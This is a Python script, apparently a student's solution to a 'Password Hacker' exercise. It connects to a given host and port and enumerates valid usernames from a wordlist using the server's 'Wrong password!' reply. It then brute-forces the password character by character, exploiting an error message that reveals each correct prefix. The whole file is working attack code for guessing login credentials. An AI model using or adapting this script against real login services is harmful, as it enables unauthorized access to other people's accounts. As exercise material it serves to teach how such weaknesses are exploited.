from socket import socket
from json import load, loads, dump, dumps
import sys

# change the below code to take commands from the CLI using sys
address = (sys.argv[1], int(sys.argv[2]))
# print("Connected...")

with socket() as client:
    client.connect(address)

    # add full path for logins!!!!!!!!!!!!
    with open(r"C:\Users\upend\PycharmProjects\Password Hacker1\Password Hacker\task\hacking\logins.txt") as names:
        logins = names.readlines()

    # print(logins)
    cleanLogins = []

    for name in logins:
        cleanLogins.append(name.strip('\n'))

    # print(cleanLogins)

    rightLogin = " "

    sendLoginJson = {
        "login": " ",
        "password": " "
    }

    for name in cleanLogins:
        sendLoginJson["login"] = name
        with open("clientMessage.json", 'w') as clientMessageJsonFile:
            dump(sendLoginJson, clientMessageJsonFile)

        with open("clientMessage.json", 'rb') as readClientMessageJsonFile:
            dataInsideClientJson = readClientMessageJsonFile.read()

        client.send(dataInsideClientJson)
        serverResponse = (client.recv(2048)).decode()
        # print(serverResponse)
        # since response is decoded in string, we'll have to slice the response to get the result context
        serverMessageStartIndex = 12
        serverMessageEndIndex = len(serverResponse) - 2

        serverResult = serverResponse[serverMessageStartIndex: serverMessageEndIndex]

        if serverResult == "Wrong password!":  # means you got the right login and now store it in rightLogin
            rightLogin = name
            break

    # password = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    # passwordList = []
    #
    # counter = 0
    # size = len(password)
    #
    # for letter in password:
    #     passwordList.pop()
    #     passwordList.append(letter)

    # looping for password

    password = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    passwordList = [' ']
    blankIndex = 0
    sendPassword = ' '

    while True:
        for letter in password:
            passwordList[blankIndex] = letter
            sendPassword = ''.join(passwordList)
            sendLoginJson['password'] = sendPassword
            with open("clientMessage.json", 'w') as clientMessageJsonFile:
                dump(sendLoginJson, clientMessageJsonFile)

            with open("clientMessage.json", 'rb') as readClientMessageJsonFile:
                dataInsideClientJson = readClientMessageJsonFile.read()

            client.send(dataInsideClientJson)
            serverResponse = (client.recv(2048)).decode()

            serverMessageStartIndex = 12
            serverMessageEndIndex = len(serverResponse) - 2

            serverResult = serverResponse[serverMessageStartIndex: serverMessageEndIndex]
            # print(''.join(passwordList))
            if serverResult == "Exception happened during login":
                passwordList.append(' ')
                blankIndex += 1
                break
            elif serverResult == "Connection success!":
                with open(rb"clientMessage.json") as clientMessageJsonFilePrint:
                    dataInsideClientJsonPrint = clientMessageJsonFilePrint.read()

                print(dataInsideClientJsonPrint)
                exit()
